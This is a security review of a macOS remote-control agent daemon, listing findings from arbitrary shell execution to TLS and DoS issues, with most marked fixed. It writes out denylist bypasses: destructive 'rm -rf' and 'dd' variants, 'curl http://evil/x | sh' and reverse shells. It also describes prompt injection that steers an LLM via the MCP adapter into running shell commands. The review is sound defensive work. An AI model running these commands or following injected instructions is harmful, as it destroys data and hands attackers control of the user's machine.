# Security Review — hermes-mac-agent

**Reviewer:** Senior security review (automated)
**Date:** 2026-08-23
**Scope:** `hermes_mac_agent/` (protocol, daemon config/tools/server, client, MCP adapter), `scripts/setup_mac.sh`, `launchd/com.hermes.mac-agent.plist`

> **Status (2026-08-23):** All **Critical** and **High** findings (F1–F4) and all
> **Medium** findings (F5–F8) have been **fixed** and are covered by the test suite
> (81 passing). Remaining items are Low/Info hardening (F9–F12). See §7.

---

## 1. Threat model & context

This is a **remote-control agent**: a daemon on a MacBook exposes screen capture,
mouse/keyboard control, GUI app launch, **arbitrary shell command execution**, and
process kill over a TLS WebSocket. The client (the "Hermes" agent, possibly LLM-driven)
dials in with a **single shared token** as the only credential.

Because the blast radius of a compromised session is **full control of the host**
(arbitrary code execution as the daemon user, screen/keylogging, process kill), the
security properties that matter most are:

1. **Authentication** — who can open a session (the token).
2. **Transport integrity/confidentiality** — TLS, so the token and traffic can't be
   sniffed or MITM'd on the LAN.
3. **Authorization / command policy** — what an authenticated session may do
   (the allow/deny list).
4. **Availability** — the daemon must not be trivially DoS'd.

The design is *reasonable for a trusted-LAN tool*, but it has a small number of
**high-severity** issues that materially weaken it, plus several medium/low ones.
The single most important finding is that **the command "policy" is a thin,
trivially-bypassable blocklist in front of `shell=True`**, so it provides a false
sense of safety.

---

## 2. Findings summary

| # | Severity | Title | Location |
|---|----------|-------|----------|
| F1 | **Critical** ✅ | Arbitrary shell execution gated only by a bypassable blocklist (`shell=True`) | `daemon/tools.py` |
| F2 | **High** ✅ | Daemon binds `0.0.0.0` (all interfaces) by default | `daemon/config.py`, `scripts/setup_mac.sh` |
| F3 | **High** ✅ | TLS verification is one flag/env away from off (`CERT_NONE`) → token-stealing MITM | `client/mac_agent.py`, `mcp_adapter.py` |
| F4 | **High** ✅ | Request timeout does **not** kill the subprocess → orphaned processes / resource exhaustion | `daemon/server.py`, `daemon/tools.py` |
| F5 | **Medium** ✅ | Unbounded subprocess output captured in memory → memory-exhaustion DoS | `daemon/tools.py` |
| F6 | **Medium** ✅ | Self-signed cert + `load_default_certs()` fallback pushes users toward `verify=False` | `client/mac_agent.py`, `scripts/setup_mac.sh` |
| F7 | **Medium** ✅ | No audit log of executed commands / launched apps | `daemon/server.py` |
| F8 | **Medium** ✅ | LLM-driven MCP surface = prompt-injection → arbitrary command path | `mcp_adapter.py` |
| F9 | **Low** | `stop_process` reflects user input into `getattr(signal, ...)` | `daemon/tools.py:331` |
| F10 | **Low** | No per-IP connection rate limiting (auth brute-force / connection flood) | `daemon/server.py` |
| F11 | **Info** | Token is the only secret; no client-certificate or per-session binding | `daemon/server.py:71` |
| F12 | **Info** | Grandchild processes from `shell=True` are never reaped | `daemon/tools.py:283` |

**Input validation** and **memory safety / "buffer overruns"** are addressed
dedicatedly in §4 and §5.

---

## 3. Detailed findings

### F1 — Critical — Arbitrary shell execution behind a bypassable blocklist

`tool_run_command` runs the client-supplied string with a shell:

```python
proc = subprocess.run(cmd, shell=True, cwd=cwd, capture_output=True, text=True, timeout=timeout)
```

The only gate is `config.check_command(cmd)`, which is a **denylist evaluated with
glob / whole-word-prefix matching** (`Config._matches`, `daemon/config.py`). The
default policy is `allowlist: ["*"]` (allow everything) plus a 5-entry denylist:

```
["sudo", "rm -rf /", "dd if=*", "mkfs*", "diskutil eraseDisk*"]
```

This is a **blocklist in front of a shell**, which is the wrong model. It is trivially
bypassed. Concrete bypasses:

- `rm -rf /` (no glob chars) matches only the exact string or a `"rm -rf / "` prefix.
  Not blocked: `rm -rf /*`, `rm -rf /Users`, `rm -rf ~`, `rm -rf $HOME`,
  `rm -fr /`, `rm -r -f /`, `rm -rf / --no-preserve-root`, `find / -delete`.
- `sudo` (no glob) blocks `sudo …` but not `sudoedit`, `doas`, or `pkexec` — all of
  which escalate privileges.
- `dd if=*` blocks reads via `dd`, but `dd of=/dev/disk0s1` (no `if=`) overwrites a
  disk and is not blocked. `hdiutil`, `fdisk`, `gpt` are not blocked.
- Nothing stops `curl http://evil/x | sh`, `python3 -c '…'`, reverse shells,
  `base64 -d | sh`, writing a setuid binary, `launchctl` abuse, etc.

**Impact:** Anyone who holds the token (see F3/F11 for how that secret can leak) has
**unrestricted root-adjacent code execution**. The denylist gives operators a false
sense that "dangerous" commands are stopped.

**Recommendation:**
- Treat the token + TLS as the *only* real control and say so explicitly in the docs;
  do **not** market the denylist as a safety boundary.
- If a command policy is genuinely wanted, invert it to a **default-deny allowlist**
  of specific approved commands/args, and match on the **parsed argv** (e.g.
  `shlex.split`) rather than a glob over the raw string. Never rely on a blocklist.
- Consider running the daemon under a **dedicated low-privilege user** and/or a
  sandbox (Seatbelt / `sandbox-exec`, or a container) so that even a fully
  authenticated session cannot touch the whole host.
- Drop `shell=True` where possible; if a shell is required for the feature, at minimum
  run in a new process group and kill the group on completion/timeout (see F4/F12).

---

### F2 — High — Binds all interfaces by default

`DEFAULT_HOST = "0.0.0.0"` (`daemon/config.py:36`) and `setup_mac.sh` hardcodes
`HOST="0.0.0.0"`. The daemon therefore listens on **every** network interface,
exposing a full-host-control service to the entire LAN (and any other attached
network) rather than just the intended peer.

**Impact:** Expands the network attack surface. Combined with F3 (easy TLS-disable)
and F11 (token is the only secret), any host that can reach the Mac and obtain/guess
the token gets full control.

**Recommendation:** Default to `127.0.0.1` or the specific LAN interface; require an
explicit, documented opt-in to bind wider. Document that binding to `0.0.0.0` is
insecure on untrusted networks.

---

### F3 — High — TLS verification is trivially disabled → token-stealing MITM

The client can be constructed with `verify=False`:

```python
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE      # client/mac_agent.py:168
```

and the MCP adapter disables it with a single env var:
`HERMES_MAC_NO_VERIFY=1` (`mcp_adapter.py:53`).

Because the **shared token is the only credential** and it is sent in the first
frame, an on-path attacker who gets the client to skip verification can **passively
capture the token** and then open their own fully-authorized session. On a shared
LAN / hotel / café network this is a realistic MITM.

**Impact:** Full host compromise via token theft.

**Recommendation:**
- Make `verify=False`/`NO_VERIFY` loud (log a warning, require an explicit
  second confirmation) and never the default.
- Prefer **certificate pinning** (pin the self-signed leaf's SHA-256) so a MITM
  presenting a different cert is rejected even if the user "trusts" a CA.
- Better: use **mutual TLS (client certificates)** so possession of the token alone
  is insufficient (see F11).

---

### F4 — High — Timeout does not kill the subprocess (orphaned processes / DoS)

The server wraps each tool call:

```python
result = await asyncio.wait_for(
    asyncio.to_thread(handler, req.params), timeout=DEFAULT_REQUEST_TIMEOUT)  # 120s
```

`asyncio.to_thread` runs the handler in a **thread that cannot be cancelled**. When
`wait_for` times out it abandons the future, but the thread — and the **child process
it spawned** — keep running.

Two concrete problems:

1. The client controls `run_command`'s `timeout` param. If it is set above 120s,
   `subprocess.run` keeps the child alive well past the server's 120s give-up, and the
   child is **never killed** → orphaned process.
2. Even within the window, `subprocess.run(timeout=…)` only terminates the **direct
   child** (the `/bin/sh` from `shell=True`), **not its grandchildren**. A command like
   `sleep 1000 &`, `nohup … &`, or a shell that forks leaves survivors.

**Impact:** An authenticated (or token-stolen) client can spawn unbounded
long-running / resource-hogging processes that the daemon cannot reap → availability
DoS and a growing pile of orphaned processes.

**Recommendation:**
- Run commands in their **own process group** (`start_new_session=True` /
  `preexec_fn=os.setsid`) and on timeout/completion kill the **whole group**
  (`os.killpg`).
- Cap the effective timeout to the server's `DEFAULT_REQUEST_TIMEOUT` regardless of
  the client-supplied value.
- Track spawned PIDs and reap/kill them on connection close.

---

### F5 — Medium — Unbounded subprocess output → memory-exhaustion DoS

`subprocess.run(..., capture_output=True)` reads **all** stdout/stderr into memory with
no size cap. A command such as `yes | head -c 2000000000`, `cat /dev/zero`, or
`find / -print` can produce gigabytes before the timeout fires, exhausting daemon
memory.

**Impact:** Memory-exhaustion DoS of the daemon (and potentially the host).

**Recommendation:** Stream and truncate output (e.g. cap at N KB, keep head+tail), or
write to a temp file and read back a bounded prefix. Never buffer unbounded output.

**Fixed:** `tool_run_command` now drains both pipes concurrently in a single
`select` loop (no `communicate` deadlock) and retains only the first and last
256 KB of each stream via `_BoundedBuffer`, inserting a
`... [N bytes truncated] ...` marker. The full stream is still drained so the
child never blocks on a full pipe, and the wall-clock deadline is enforced
before the group is killed.

---

### F6 — Medium — Self-signed cert + default-CA fallback pushes users to `verify=False`

When no `ca_cert` is supplied the client calls `ctx.load_default_certs()`
(`client/mac_agent.py:174`). A self-signed leaf is **not** in the system trust store,
so verification fails and the practical path for users is to set `verify=False`
(→ F3). The design nudges operators toward the insecure configuration.

**Recommendation:** Ship a small **pinned-CA** flow: generate a local CA, sign the
leaf with it, and have the client pin/load that CA by default. Make a working
verified connection the path of least resistance.

**Fixed:** `scripts/setup_mac.sh` now generates a **local CA** (`ca.pem`) and a
**leaf cert** (`cert.pem`) it signs; the daemon serves the leaf and the client
verifies it against the CA (`ca_cert=.../ca.pem`) — a working verified
connection is now the path of least resistance. The client also logs a loud
warning when `verify=True` but no `ca_cert` is supplied (the case that used to
silently fail and push users to `verify=False`).

---

### F7 — Medium — No audit log of executed commands / launched apps

Only auth failures and tool *exceptions* are logged. **Successful** `run_command` and
`launch_app` calls are not recorded. For a remote-control agent this is a significant
forensics/governance gap: after an incident there is no trail of what was run, by
which connection, when.

**Recommendation:** Log (to a tamper-resistant, append-only sink) every authenticated
command/app launch with timestamp, source address, and command. Consider signing or
shipping logs off-host.

**Fixed:** `daemon/server.py` now appends a JSON line to
`~/.hermes_mac_agent/audit.log` (mode 600) for **every** authenticated tool call
and **every** auth attempt (success or failure), recording a UTC timestamp,
source address, method, params, and outcome. The write is best-effort and never
takes the daemon down. (Off-host shipping / signing is still a future hardening
step.)

---

### F8 — Medium — LLM-driven MCP surface is a prompt-injection → RCE path

The MCP adapter (`mcp_adapter.py`) exposes `run_command`, `launch_app`, etc. directly
to an LLM. Any content the model ingests (web pages, files, emails) can carry
**prompt injection** that steers the model into calling `run_command` with an
attacker-chosen string. Because F1 makes that string a real shell, prompt injection
becomes **remote code execution on the Mac** with no human in the loop.

**Recommendation:**
- For the MCP/LLM surface, enforce a **default-deny allowlist** of safe commands and
  disable raw `run_command` unless explicitly enabled.
- Add a human-approval gate for high-risk tools.
- Never feed untrusted content into the same context that can trigger shell tools
  without sanitization.

**Fixed:** The MCP `run_command` tool is now **disabled by default** and only
becomes callable when `HERMES_MAC_ALLOW_RUN_COMMAND=1` is set; otherwise it
raises an explanatory error. This removes the raw shell tool from the default
LLM surface. (A human-approval gate and content sanitization remain future
hardening steps.)

---

### F9 — Low — `stop_process` reflects input into `getattr(signal, …)`

```python
sig_name = str(params.get("signal", "TERM")).upper()
if not sig_name.startswith("SIG"):
    sig_name = "SIG" + sig_name
sig = getattr(signal, sig_name, None)
```

The value is constrained to `SIG*` names and unknowns resolve to `None` (→ error), so
the practical risk is low. But reflecting user input into `getattr` on a stdlib module
is a fragile pattern.

**Recommendation:** Use an explicit allow-set: `{"TERM","KILL","INT","HUP",...}` →
`signal.SIG*`. Reject anything else.

---

### F10 — Low — No per-IP rate limiting

There is no throttling on new connections or on repeated `auth` failures. The token is
256-bit random (so online brute-force is infeasible), but an on-path / LAN attacker can
still **flood connections** to exhaust file descriptors / event-loop capacity, or probe
repeatedly.

**Recommendation:** Add per-source-IP connection and auth-failure rate limiting, and a
max concurrent-connection cap.

---

### F11 — Info — Token is the only secret

Auth is a single shared bearer token compared in constant time
(`hmac.compare_digest`, `daemon/server.py:71` — good). But there is no
client-certificate auth, no per-session nonce, and no binding of the token to a
transport identity. Anyone who obtains the token (log, config file on a shared box,
MITM via F3) has full access, and the token is static (no rotation).

**Recommendation:** Add mutual TLS and/or short-lived tokens with rotation; scope
tokens per-client.

---

### F12 — Info — Grandchild processes are never reaped

Related to F4: with `shell=True`, the daemon's child is a shell; anything that shell
spawns is a grandchild the daemon has no handle to and never reaps.

**Recommendation:** Process-group kill (F4) plus, where feasible, avoid `shell=True`.

---

## 4. Input validation (dedicated review)

Validation is **good for the GUI tools** and **weak/absent for the process tools** —
which is exactly where the risk is.

**Well-validated (no action needed):**
- `screenshot.monitor` — int, non-bool, `>= 0`, range-checked against `sct.monitors`.
- `mouse_move/click/drag` — `x/y` enforced as real ints (`_int_param` rejects bools);
  `x`/`y` must be provided together; `clicks >= 1`.
- `mouse_click.button` / `mouse_drag.button` — restricted to `left/right/middle`.
- `type_text.text` — must be `str`; `interval` coerced to `float`.
- `key_press.keys` — non-empty list of non-empty strings.
- `stop_process.pid` — must be `int`.
- `run_command.cmd` — must be a non-empty `str`.
- `launch_app.app` — must be a non-empty `str`.
- Protocol layer: `Request.parse` enforces `id:int`, `method:non-empty str`,
  `params:object`; malformed JSON → `ProtocolError`.

**Gaps / concerns:**
- **`run_command.cwd`** — passed straight to `subprocess` with no validation. Not a
  direct vuln (the caller already has a shell), but an unvalidated path is sloppy and
  can produce confusing errors / unexpected behavior. Validate it's an existing dir.
- **`run_command.timeout`** — client-controlled `float`, not clamped. It is *partially*
  bounded by the server's 120s `wait_for`, but because that timeout doesn't kill the
  child (F4), a large value is still exploitable. Clamp it.
- **`launch_app.url`** — passed as an argv element to `open` (list form, no shell), so
  no injection; but it's unvalidated and could be a `file://`/custom-scheme URL that
  triggers app behavior. Low risk; consider scheme allow-listing.
- **Frame-size policy is now explicit.** Both `websockets.serve` (daemon) and
  `websockets.connect` (client) pass `max_size=WS_MAX_MESSAGE_SIZE`
  (16 MiB, defined in `protocol.py`). The 1 MiB library default was too small
  for screenshot responses (large-display PNGs base64-encoded exceed it) and
  was an implicit, undocumented bound. 16 MiB still caps single-message DoS
  while covering the worst case of a `MAX_FILE_SIZE` (10 MiB) PNG
  base64-encoded (~13.4 MiB) plus JSON envelope overhead.
- **`stop_process.signal`** — see F9 (reflection rather than an allow-set).

**Bottom line:** the *typed* parameters are validated well; the *string* parameters
that reach a shell (`cmd`, `cwd`, `timeout`) are the weak spot, and that weakness is
structural (F1/F4/F5), not a missing type check.

---

## 5. Memory safety / "buffer overruns" (dedicated review)

This is a **pure-Python** codebase with no C extensions written here, so **classic
C/C++ buffer overreads/overwrites do not apply** — there are no fixed-size buffers,
`memcpy`, or manual pointer arithmetic to overflow. The native libraries it calls
(`mss`, `Pillow`, `psutil`, `pyautogui`, `CoreGraphics`/`ApplicationServices` via
`ctypes`) are mature and their buffer handling is internal to them.

The **closest real analogs** to a "buffer overrun" here are **unbounded-allocation /
memory-exhaustion** vectors, which do exist:

1. **Unbounded subprocess output capture** (F5) — the primary one. `capture_output=True`
   with no cap lets a command allocate gigabytes in the daemon's heap. This is the
   "buffer grows without bound" failure mode in this codebase.
2. **`ctypes` FFI calls** (`_screen_recording_granted`, `_accessibility_granted`) —
   these call `CGPreflightScreenCaptureAccess` / `AXIsProcessTrusted` with
   `restype = c_bool` and no arguments. Correctly declared, no buffer involved, no
   overrun risk. (If these were ever extended to take/return buffers, `argtypes`/
   `restype` would need to be set explicitly — they are, for the current calls.)
3. **Image construction** — `Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")`
   uses `raw.size`/`raw.bgra` **provided by `mss`**, not by the client, so the client
   cannot craft a size/length mismatch. No overrun.
4. **Base64 / PNG round-trips** (screenshot out, client in) — length is derived from
   the actual bytes; `base64.b64decode` and `Image.open` validate their input. No
   overrun.

**Bottom line:** no buffer-overrun class of bug is present. The memory-safety story
reduces to **bounding unbounded allocations** — fix F5 (cap output) and F4 (reap
processes) and the daemon's memory footprint becomes bounded.

---

## 6. What's done well

- **Constant-time token comparison** via `hmac.compare_digest` (`server.py:71`).
- **Auth gate is correct:** every non-`auth` method before a successful auth returns
  `AUTH_REQUIRED` and the connection is closed (code 4401). No unauthenticated
  endpoint leaks data (`health` is auth-gated too).
- **TLS by default** on the transport; self-signed cert + key written `0600`, config
  dir `0700`, `config.json` `0600`.
- **Strong token entropy** (`openssl rand -hex 32` = 256 bits).
- **Typed parameter validation** across the GUI tools (see §4).
- **Lazy GUI imports** keep the daemon importable/headless-testable.
- **TCC preflight** (`CGPreflightScreenCaptureAccess`, `AXIsProcessTrusted`) gives
  clear permission errors instead of silent failures.
- **Per-request timeout** exists (the *enforcement* is the gap, F4).

---

## 7. Prioritized remediation

**Done (F1–F8):**
1. **F1** ✅ — Default-deny allowlist (empty by default); denylist documented as a
   non-security safety net.
2. **F4** ✅ — Commands run in their own process group; the whole group is killed on
   timeout; client timeout clamped to 300s.
3. **F3 + F6** ✅ — Local CA + signed leaf; verified TLS is the path of least
   resistance; `verify=False` / missing `ca_cert` log loud warnings.
4. **F2** ✅ — Default bind to `127.0.0.1`; opt-in to wider via `--host`.
5. **F5** ✅ — Subprocess output bounded (head+tail 256 KB, drained concurrently).
6. **F7** ✅ — Every authenticated call + auth attempt audit-logged to `audit.log`.
7. **F8** ✅ — MCP `run_command` disabled unless `HERMES_MAC_ALLOW_RUN_COMMAND=1`.

**Remaining hardening (F9–F12, Low/Info):**
8. **F9** — Signal allow-set. **F10** — Rate limiting. **F11** — mTLS / token
   rotation. **F12** — covered by F4.

---

*End of report.*
